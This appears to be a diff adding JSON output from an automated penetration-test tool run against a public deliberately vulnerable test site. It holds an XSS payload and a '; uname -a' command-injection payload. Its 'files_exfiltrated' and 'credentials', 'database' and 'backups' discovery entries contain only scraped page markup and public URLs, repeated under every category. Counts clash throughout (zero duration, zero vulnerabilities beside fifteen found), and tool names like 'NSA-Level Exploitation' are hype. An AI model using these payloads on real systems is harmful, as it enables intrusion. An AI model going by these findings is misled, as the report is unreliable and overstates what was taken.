+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "position",
+            "images": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "clsid",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "width",
+            "images": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "clsid",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "z-index",
+            "images": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "clsid",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "clsid",
+            "images": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "clsid",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "mailto",
+            "images": "wvs@acunetix.com"
+          }
+        }
+      ]
+    },
+    {
+      "type": "XSS",
+      "severity": "high",
+      "payload": "<script>alert(1)</script>",
+      "parameter": "test",
+      "session_hijack_possible": false
+    },
+    {
+      "type": "Command Injection",
+      "severity": "critical",
+      "payload": "; uname -a",
+      "parameter": "test",
+      "system_info": {},
+      "files_exfiltrated": [
+        {
+          "file": "config_.env",
+          "data": [
+            "template=\"/Templates/main_dynamic_template.dwt.php\"",
+            "codeOutsideHTMLIsLocked=\"false\"",
+            "equiv=\"Content-Type\"",
+            "content=\"text/html;",
+            "charset=iso-8859-2\">"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "credentials",
+          "files": [
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/Templates/main_dynamic_template.dwt.php",
+            "/add.swf",
+            "/logo.gif",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//www.acunetix.com"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "config",
+          "files": [
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/Templates/main_dynamic_template.dwt.php",
+            "/add.swf",
+            "/logo.gif",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//www.acunetix.com"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "source_code",
+          "files": [
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/Templates/main_dynamic_template.dwt.php",
+            "/add.swf",
+            "/logo.gif",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//www.acunetix.com"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "database",
+          "files": [
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/Templates/main_dynamic_template.dwt.php",
+            "/add.swf",
+            "/logo.gif",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//www.acunetix.com"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "backups",
+          "files": [
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/Templates/main_dynamic_template.dwt.php",
+            "/add.swf",
+            "/logo.gif",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//www.acunetix.com"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "logs",
+          "files": [
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "/index.php",
+            "/Templates/main_dynamic_template.dwt.php",
+            "/add.swf",
+            "/logo.gif",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "//www.macromedia.com/shockwave/download/index.cgi",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "//www.acunetix.com"
+          ]
+        }
+      ]
+    }
+  ],
+  "evidence": [],
+  "intelligence": {},
+  "risk_assessment": {
+    "overall_score": 60.0,
+    "severity": "Medium",
+    "cvss_base": 6.0,
+    "exploitability": 0,
+    "vulnerability_count": 0,
+    "exploit_count": 3,
+    "critical_findings": 2
+  },
+  "recommendations": [
+    {
+      "priority": "Critical",
+      "issue": "SQL Injection Vulnerability",
+      "recommendation": "Implement parameterized queries and input validation",
+      "affected_parameter": "test"
+    },
+    {
+      "priority": "High",
+      "issue": "Cross-Site Scripting (XSS)",
+      "recommendation": "Implement output encoding and Content Security Policy",
+      "affected_parameter": "test"
+    },
+    {
+      "priority": "Critical",
+      "issue": "Command Injection Vulnerability",
+      "recommendation": "Never pass user input directly to system commands. Use whitelisting.",
+      "affected_parameter": "test"
+    },
+    {
+      "priority": "High",
+      "issue": "General Security Posture",
+      "recommendation": "Implement Web Application Firewall (WAF)",
+      "affected_parameter": "All"
+    },
+    {
+      "priority": "Medium",
+      "issue": "Security Headers",
+      "recommendation": "Add security headers: CSP, X-Frame-Options, HSTS",
+      "affected_parameter": "HTTP Response"
+    }
+  ],
+  "executive_summary": {
+    "target": "http://testphp.vulnweb.com",
+    "test_date": "2025-11-05",
+    "duration": "0.00 seconds",
+    "phases_completed": 14,
+    "vulnerabilities_found": 15,
+    "exploits_successful": 3,
+    "critical_findings": 2,
+    "risk_level": "Medium",
+    "overall_score": 60.0
+  },
+  "technical_details": {
+    "methodology": "IQ 200 Ultimate Pentest - NSA-Level Framework",
+    "phases": [
+      "Target Reconnaissance",
+      "WAF Detection",
+      "Attack Surface Mapping",
+      "Payload Generation",
+      "Vulnerability Scanning",
+      "Automated Exploitation",
+      "SQL Injection & Data Exfiltration",
+      "Command Injection & File Hunting",
+      "XSS & Client-Side Attacks",
+      "Authentication Bypass",
+      "Business Logic Testing",
+      "Post-Exploitation",
+      "Evidence Collection",
+      "Risk Assessment"
+    ],
+    "tools_used": [
+      "NSA-Level Exploitation",
+      "IQ 200 Data Exfiltrator",
+      "IQ 200 File Hunter",
+      "Genetic Payload Engine"
+    ],
+    "total_findings": 15,
+    "evidence_items": 0
+  },
+  "timeline": [],
+  "status": "running"
+}
